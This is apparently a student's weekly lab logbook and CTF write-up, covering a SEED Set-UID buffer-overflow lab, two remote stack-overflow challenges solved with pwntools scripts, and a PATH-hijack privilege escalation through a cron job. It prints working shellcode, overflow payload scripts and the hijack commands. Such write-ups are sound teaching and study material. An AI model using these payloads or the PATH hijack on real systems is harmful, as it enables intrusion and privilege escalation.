# **Week #5** 

## **SEEDs Lab**

### Buffer Overflow Attack Lab (Set-UID Version)

- First we turned off the linux countermeasures, such as Address Space Randomization using the command shown on the lab guide, and then configured the /bin/sh so that the shell allows for Set-UID program attacks

![Terminal print countermeasures](/images/Logbook5%20images/countermeasures.png)


### **Task 1: Getting Familiar with Shellcode** 

- Compiled and ran the program 
- Both 32-bit and 64-bit versions granted us access to the shell

![Terminal print task1](/images/Logbook5%20images/task1.png)


### **Task 2: Understanding the Vulnerable Program** 

- Compiled the program using **make**, which ran a makefile already configured to compile the program with the correct flags to enable the attack, such as turning off the StackGuard, and running the commands to make the program Set-UID
- Checked the permissions of the resulting programs, confirming the Set-UID bit

![Terminal print task2](/images/Logbook5%20images/task2.png)


### **Task 3: Launching Attack on 32-bit Program (Level 1)** 

- First ran the debug version of the program to understand the locations of each variable in the Stack. We used a break point in the function where the overflow is possible to analyze the addresses at that point in the program execution

![Terminal print task3](/images/Logbook5%20images/task31.png)

![Terminal print task3](/images/Logbook5%20images/task32.png)

Then, changed the variables in the python script. This script will output to a file the contents to be written on the buffer to overflow

- Changed the offset to 112, which is the distance between the start of the buffer and the return address that we want to rewrite (ebp - buffer) + 4bits = 108 + 4 = 112 

- Changed the ret value to the address to which we want the program to jump to

- Changed the start value to match the start of the shellcode in the buffer with the position the program is going to jump to

**Python Script**

``` python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517- len(shellcode)               # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0xffffcabc     # Change this number
offset = 112           # Change this number

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
```

# CTF - Week 5

## Task 1

### Checksec
 * Architecture is x86 (Arch);
 * There is no canary protecting the return address (Stack);
 * The stack has execution permissions(NX);
 * Binary Positions are not randomized (PIE);
 * The are memory segments with permission to read,write and execute (RWX).

### Program analysis
 
 * mem.txt is opened by the program and saved in an array;
 * buffer value is read from input;
 * There is no buffer overflow;

### Program Source Code 

 ```c

#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%28s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}

 ```

### Attack

* Cause a buffer overflow on 'buffer' by inputing more than 20 byte (space it has initiliazed);
* After inputing more than 20 bytes, write that you want the array with name of the file flag.txt;
* This way we will open the file flag.txt

The described attack is done in the last 3 lines in the Python script.

### Python script

``` python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"1234567890123456789\0flag.txt")
r.interactive()

``` 

### Result 

![result](/images/CTF%205/Task1Result.png)

**Flag 1** - flag{91bd5c3ed28dc428b3ad7af35ce12f43}

# Task 2

### Checksec
   * Checksec will display the same information of the program in the first task;

   ![checksec2](/images/CTF%205/Task2Checksec.png)

### Program analysis
    * The program has a new defense, a new buffer between the buffer we overflow and the target
    * It will check if we change its value
 

### Program

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char val[4] = "\xef\xbe\xad\xde";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    
    if(*(int*)val == 0xfefc2223) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

### Attack
  * To bypass this all we need to do is input the correct sequence of characters in this new buffer, using the following script:

### Python Script
  ```python

  #!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")
teste = bytearray(b":1234567890123456790");

teste.append(0x23);
teste.append(0x22);
teste.append(0xfc);
teste.append(0xfe);

teste.extend(b"flag.txt");

r.sendline(teste);

r.interactive()
```

### Result

![result2](/images/CTF%205/Task2Result.png)

**Flag 2** - flag{0e68e08552b7bfe81eb7f7201d81d023}

## Extra CTF 

### Program analysis

This program will check if the file "/flags/flag.txt" exists.

### Program

```c
// main.c

#include <stdio.h>
#include <unistd.h>

void my_big_congrats(){
    puts("TODO - Implement this in the near future!");
}

int main() {
    puts("I'm going to check if the flag exists!");

    if (access("/flags/flag.txt", F_OK) == 0) {
        puts("File exists!!");
        my_big_congrats();
    } else {
        puts("File doesn't exist!");
    }

    return 0;

```


### Attack

We need to find if the file exists.

* create in /tmp the file printenv with :
    ```console
        cat /flags/flag.txt > printenv
        chmod 777 printenv
    ```
* create in /tmp the file env with:
    ```console
        echo PATH="/tmp:$PATH" > env
    ```
We need to change the PATH so that we can run our new printenv in /tmp anywhere.

### Script analysis

When there is env program in /tmp, we will run this script and the script will export variables "/usr/bin/cat /tmp/env | /usr/bin/xargs". After that, our printenv will be use to reach the content in the flag.
    
### Script

    ```console 
        #!/bin/bash

        if [ -f "/tmp/env" ]; then
        echo "Sourcing env"
        export $(/usr/bin/cat /tmp/env | /usr/bin/xargs)
        rm /tmp/env
        fi

        printenv
        exec /home/flag_reader/reader
    ```    

The script my_script.sh will run automatically because of the script in /etc/cron.d, you can check last_log in /tmp you will see the flag because the printenv has been replaced with our version.

```console
    PATH=/bin:/usr/bin:/usr/local/bin
    * * * * * flag_reader /bin/bash -c "/home/flag_reader/my_script.sh > /tmp/last_log"
```

![Extra_result](/images/CTF%205/Extra/flag.png)

**Extra flag** - flag{f8aec487d4db57089b34e440a2163762}


